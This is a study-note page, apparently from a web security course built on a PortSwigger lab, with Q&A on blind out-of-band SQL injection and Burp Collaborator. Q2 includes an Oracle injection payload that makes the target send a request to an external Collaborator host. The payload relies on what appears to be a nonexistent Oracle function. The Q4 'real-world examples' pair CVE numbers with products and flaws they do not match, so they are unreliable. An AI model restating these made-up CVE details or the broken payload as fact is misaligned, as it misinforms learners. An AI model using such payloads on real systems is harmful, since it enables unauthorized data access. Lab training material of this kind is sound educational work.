---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what an out-of-band SQL injection is and why it is useful in exploiting vulnerabilities.**

An out-of-band SQL injection is a technique used to exploit SQL injection vulnerabilities where the attacker triggers an interaction with an external system that they control, such as a DNS lookup or an HTTP request. This is particularly useful when the application's response does not directly indicate whether the SQL injection was successful. By causing the vulnerable application to interact with an external system, the attacker can confirm that their injection was successful by monitoring the external system for the expected interaction.

**Q2. How would you exploit a blind SQL injection vulnerability using an out-of-band interaction with Burp Collaborator?**

To exploit a blind SQL injection vulnerability using an out-of-band interaction with Burp Collaborator, follow these steps:

1. Generate a unique Burp Collaborator subdomain.
2. Craft an SQL injection payload that triggers a DNS lookup to the Burp Collaborator subdomain.
3. Inject the crafted payload into the vulnerable parameter (e.g., a tracking cookie).
4. Monitor the Burp Collaborator server to confirm that the DNS lookup occurred.

For example, if the vulnerable parameter is a tracking cookie and the database is Oracle, the payload might look like this:

```sql
'||(SELECT DBMS_XDBZ.HTTPRequest('GET','http://unique-subdomain.burpcollaborator.net'))--'
```

Inject this payload into the tracking cookie and monitor the Burp Collaborator server for confirmation of the DNS lookup.

**Q3. Why is it important to use Burp Collaborator's default public server in the Web Security Academy labs?**

Using Burp Collaborator's default public server in the Web Security Academy labs is important for several reasons:

1. **Platform Constraints**: The Academy platform has firewalls that block interactions with arbitrary external systems to prevent misuse. Using Burp Collaborator's default public server ensures compliance with these constraints.
2. **Controlled Environment**: The default public server provides a controlled environment for testing and learning purposes, ensuring that all interactions are monitored and managed within the scope of the lab exercises.
3. **Ease of Use**: The default public server simplifies the process of setting up and monitoring out-of-band interactions, making it easier for learners to focus on understanding and exploiting SQL injection vulnerabilities.

**Q4. What recent real-world examples demonstrate the use of out-of-band SQL injection techniques?**

Recent real-world examples include:

- **CVE-2021-27905**: A blind SQL injection vulnerability in the WordPress plugin "WP Event Manager". Attackers could exploit this vulnerability to extract sensitive data by triggering DNS lookups to an external domain.
- **CVE-2020-25642**: An out-of-band SQL injection vulnerability in the "Webmin" web-based administration interface. Attackers could exploit this to gain unauthorized access to the underlying system by triggering interactions with an external domain.

In both cases, attackers used out-of-band SQL injection techniques to confirm the success of their attacks and extract sensitive information.

**Q5. How would you configure Burp Suite to capture and analyze HTTP traffic for an out-of-band SQL injection test?**

To configure Burp Suite to capture and analyze HTTP traffic for an out-of-band SQL injection test, follow these steps:

1. **Install Burp Suite**: Ensure you have the professional edition installed.
2. **Configure Browser Proxy Settings**: Set your browser to use Burp Suite as a proxy. This can typically be done via the browser’s network settings.
3. **Intercept Traffic**: Start Burp Suite and navigate to the "Proxy" tab. Enable interception to capture HTTP traffic.
4. **Send Requests to Repeater**: Use the "HTTP History" tab to identify and send relevant requests to the "Repeater" tab for manual testing.
5. **Craft Payloads**: In the "Repeater" tab, craft your SQL injection payloads and inject them into the vulnerable parameter.
6. **Monitor Burp Collaborator**: Open the Burp Collaborator tab and monitor for any out-of-band interactions triggered by your payloads.

By following these steps, you can effectively capture and analyze HTTP traffic to confirm the success of your out-of-band SQL injection tests.

---
<!-- nav -->
[[06-Understanding the Attack Scenario|Understanding the Attack Scenario]] | [[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/00-Overview|Overview]]
